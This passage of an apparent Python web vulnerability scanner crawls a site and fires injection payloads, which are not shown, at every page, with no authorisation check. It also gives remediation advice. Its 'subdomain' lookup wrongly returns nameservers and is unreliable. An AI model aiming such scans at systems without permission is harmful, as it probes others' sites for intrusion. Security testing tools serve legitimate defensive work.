        "HTTP Parameter Pollution": "Implement server-side parameter parsing logic that is not vulnerable to parameter pollution. Use a single parameter parsing technique consistently.",
        "LDAP Injection": "Use LDAP-specific escaping techniques. Implement strict input validation for LDAP queries.",
        "NoSQL Injection": "Use parameterized queries or ORM libraries that handle NoSQL injection. Implement strict input validation.",
        "HTTP Request Smuggling": "Ensure that front-end and back-end servers agree on the boundaries of HTTP requests. Use HTTP/2 where possible.",
        "GraphQL Injection": "Implement proper input validation and sanitization for GraphQL queries. Use query whitelisting or persisted queries.",
        "Host Header Injection": "Validate and sanitize the Host header before use. Avoid using the Host header in security-critical operations.",
        "Web Cache Poisoning": "Carefully configure caching mechanisms. Validate and sanitize all inputs that might be reflected in cached responses."
    }
    return fixes.get(technique, "No specific fix available for this technique. Consult with a security expert.")

def scan_website(url):
    techniques = list(PAYLOADS.keys())
    results = []
    vulnerabilities = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        future_to_technique = {
            executor.submit(check_vulnerability, url, technique, PAYLOADS[technique]): technique 
            for technique in techniques
        }
        for future in concurrent.futures.as_completed(future_to_technique):
            technique = future_to_technique[future]
            try:
                vulnerability_results = future.result()
                for result, example, explanation, fix, payload in vulnerability_results:
                    results.append(f"{technique}: {result}")
                    vulnerabilities.append((technique, example, explanation, fix, payload))
            except Exception as e:
                results.append(f"{technique}: Error - {str(e)}")

    return "\n".join(results), vulnerabilities

def get_subdomains(domain):
    subdomains = set()
    try:
        answers = dns.resolver.resolve(domain, 'NS')
        for rdata in answers:
            subdomains.add(str(rdata))
    except:
        pass
    return subdomains

def crawl_website(url, max_pages=100):
    visited = set()
    to_visit = [url]
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    domain = parsed_url.netloc

    subdomains = get_subdomains(domain)
    for subdomain in subdomains:
        to_visit.append(f"{parsed_url.scheme}://{subdomain}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        while to_visit and len(visited) < max_pages:
            futures = []
            for _ in range(min(20, len(to_visit))):
                if to_visit:
                    current_url = to_visit.pop(0)
                    if current_url not in visited:
                        visited.add(current_url)
                        futures.append(executor.submit(fetch_links, current_url, base_url, to_visit, visited, max_pages))
            concurrent.futures.wait(futures)
    return list(visited)

def fetch_links(current_url, base_url, to_visit, visited, max_pages):
    try:
        response = make_request(current_url, method='GET', timeout=5)
        if response and response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                new_url = urljoin(base_url, link['href'])
                if new_url.startswith(base_url) and new_url not in visited and new_url not in to_visit and not new_url.endswith(('.jpg', '.png', '.mp4')):
                    to_visit.append(new_url)
                    if len(visited) + len(to_visit) >= max_pages:
                        break
    except Exception:
        pass

def generate_report(url, all_results, all_vulnerabilities):
    report = f"Scan Report for {url}\n"
    report += "=" * 50 + "\n\n"
    
    report += "Summary:\n"
    report += "-" * 20 + "\n"
    total_vulnerabilities = len(all_vulnerabilities)
    report += f"Total potential vulnerabilities found: {total_vulnerabilities}\n\n"
    
    report += "Detailed Results:\n"
    report += "-" * 20 + "\n"
    report += "\n".join(all_results) + "\n"
    
    report += "\nPotential Vulnerabilities:\n"
    report += "-" * 20 + "\n"
    for technique, example, explanation, fix, payload in all_vulnerabilities:
        report += f"{technique}:\n"
        report += f"  Vulnerability:\n"
        report += f"    Example: {example}\n"
        report += f"    Payload: {payload}\n"
        report += f"    Explanation: {explanation}\n"
        report += f"  Solution:\n"
        report += f"    {fix}\n\n"
    
    return report

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo)
    url = input("Enter the URL to scan: ").strip()
    
    if not re.match(r'^https?://', url):
        url = 'http://' + url

    print("\nCrawling website and subdomains...")
    urls_to_scan = crawl_website(url, max_pages=100)
    print(f"Found {len(urls_to_scan)} URLs to scan.")

    all_results = []
    all_vulnerabilities = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        future_to_url = {executor.submit(scan_website, scan_url): scan_url for scan_url in urls_to_scan}
        for future in concurrent.futures.as_completed(future_to_url):
            scan_url = future_to_url[future]
            try:
                results, vulnerabilities = future.result()
                all_results.append(results)
                all_vulnerabilities.extend(vulnerabilities)
                print(f"\nCompleted scanning: {scan_url}")
            except Exception as e:
                all_results.append(f"{scan_url}: Error - {str(e)}")

    print("\n--- Scan Results ---")
    if not all_vulnerabilities:
        print("No potential vulnerabilities were detected. This could be due to several reasons:")
        print("1. The website might be well-secured.")
        print("2. The payloads used might not be effective for this particular website.")
        print("3. The website might be blocking or filtering our requests.")
        print("4. There might be an issue with the scanning process or network connection.")
    else:
        print(f"Found {len(all_vulnerabilities)} potential vulnerabilities:")
        for technique, _, _, _, _ in all_vulnerabilities:
            print(f"- {technique}")

    generate_report_option = input("\nDo you want to generate a detailed report? (y/n): ").strip().lower()
    if generate_report_option == 'y':
        report = generate_report(url, all_results, all_vulnerabilities)
        filename = f"scan_report_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(report)
        print(f"\nDetailed report has been saved to {filename}")
    
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
